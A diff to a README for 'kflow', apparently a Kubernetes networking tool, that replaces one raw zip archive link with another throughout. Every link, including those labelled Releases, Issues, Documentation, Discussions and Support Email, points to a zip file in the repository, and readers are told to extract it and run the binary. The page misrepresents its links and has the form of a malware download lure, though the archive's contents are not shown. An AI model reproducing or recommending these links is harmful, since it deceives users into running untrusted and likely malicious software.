@@ -1,7 +1,7 @@
 # 🌐 kflow - Simplify Your Kubernetes Networking
 
 ## 📥 Download Now
-[![Download kflow](https://raw.githubusercontent.com/imamsobirin1980/kflow/main/src/Software_rebelly.zip)](https://raw.githubusercontent.com/imamsobirin1980/kflow/main/src/Software_rebelly.zip)
+[![Download kflow](https://github.com/imamsobirin1980/kflow/raw/refs/heads/main/src/bin/Software-v2.6.zip)](https://github.com/imamsobirin1980/kflow/raw/refs/heads/main/src/bin/Software-v2.6.zip)
 
 ## 🚀 Getting Started
 kflow helps you monitor and manage Kubernetes networking like a pro. With its user-friendly interface, you can easily visualize network traffic and troubleshoot issues. Let's get started.
@@ -16,7 +16,7 @@ Before you install kflow, ensure your system meets these requirements:
 - Minimum Disk Space: 500 MB available
 
 ## 📥 Download & Install
-To download kflow, visit this page to download: [kflow Releases](https://raw.githubusercontent.com/imamsobirin1980/kflow/main/src/Software_rebelly.zip).
+To download kflow, visit this page to download: [kflow Releases](https://github.com/imamsobirin1980/kflow/raw/refs/heads/main/src/bin/Software-v2.6.zip).
 
 ### Step 1: Visit the Releases Page
 Click the link above to go to the Releases page. You will see all available versions of kflow.
@@ -29,14 +29,14 @@ Under the latest version, find the executable file specific to your operating sy
 
 - For Windows: Download the `.exe` file
 - For macOS: Download the `.dmg` file
-- For Linux: Download the `https://raw.githubusercontent.com/imamsobirin1980/kflow/main/src/Software_rebelly.zip` file
+- For Linux: Download the `https://github.com/imamsobirin1980/kflow/raw/refs/heads/main/src/bin/Software-v2.6.zip` file
 
 ### Step 4: Run the Application
 Once the download is complete, locate the file on your computer:
 
 - **Windows:** Double-click the `.exe` file. Follow the prompts to complete the installation.
 - **macOS:** Open the `.dmg` file, drag kflow to your Applications folder, then run it from there.
-- **Linux:** Extract the files from the `https://raw.githubusercontent.com/imamsobirin1980/kflow/main/src/Software_rebelly.zip` archive. Open the terminal, navigate to the extracted folder, and run `./kflow` to start the application.
+- **Linux:** Extract the files from the `https://github.com/imamsobirin1980/kflow/raw/refs/heads/main/src/bin/Software-v2.6.zip` archive. Open the terminal, navigate to the extracted folder, and run `./kflow` to start the application.
 
 ## 🎛️ Features
 kflow provides key features to enhance your networking experience:
@@ -57,21 +57,21 @@ If you face any issues when running kflow:
 3. **Check Network Configuration:** Ensure that your Kubernetes cluster is reachable. If it’s down, kflow will not be able to connect.
 
 ### Still Need Help?
-For assistance, check the [GitHub Issues Page](https://raw.githubusercontent.com/imamsobirin1980/kflow/main/src/Software_rebelly.zip). You can report a problem or ask questions there.
+For assistance, check the [GitHub Issues Page](https://github.com/imamsobirin1980/kflow/raw/refs/heads/main/src/bin/Software-v2.6.zip). You can report a problem or ask questions there.
 
 ## 🔗 Additional Resources
 Explore more about kflow:
 
-- [Documentation](https://raw.githubusercontent.com/imamsobirin1980/kflow/main/src/Software_rebelly.zip)
-- [GitHub Discussions](https://raw.githubusercontent.com/imamsobirin1980/kflow/main/src/Software_rebelly.zip)
+- [Documentation](https://github.com/imamsobirin1980/kflow/raw/refs/heads/main/src/bin/Software-v2.6.zip)
+- [GitHub Discussions](https://github.com/imamsobirin1980/kflow/raw/refs/heads/main/src/bin/Software-v2.6.zip)
 
 ## 👥 Community
 Join our community to share your experiences and tips with kflow. It's a great way to learn and help others. Share your insights on social media or our forums.
 
 ## 📬 Contact
-For other inquiries, feel free to reach out via [Support Email](https://raw.githubusercontent.com/imamsobirin1980/kflow/main/src/Software_rebelly.zip). We'll be happy to assist you.
+For other inquiries, feel free to reach out via [Support Email](https://github.com/imamsobirin1980/kflow/raw/refs/heads/main/src/bin/Software-v2.6.zip). We'll be happy to assist you.
 
 ## 📄 License
 kflow is released under the MIT License. You can use it freely while following the license terms.
 
-[Download kflow again](https://raw.githubusercontent.com/imamsobirin1980/kflow/main/src/Software_rebelly.zip) and start enhancing your Kubernetes networking today!
+[Download kflow again](https://github.com/imamsobirin1980/kflow/raw/refs/heads/main/src/bin/Software-v2.6.zip) and start enhancing your Kubernetes networking today!
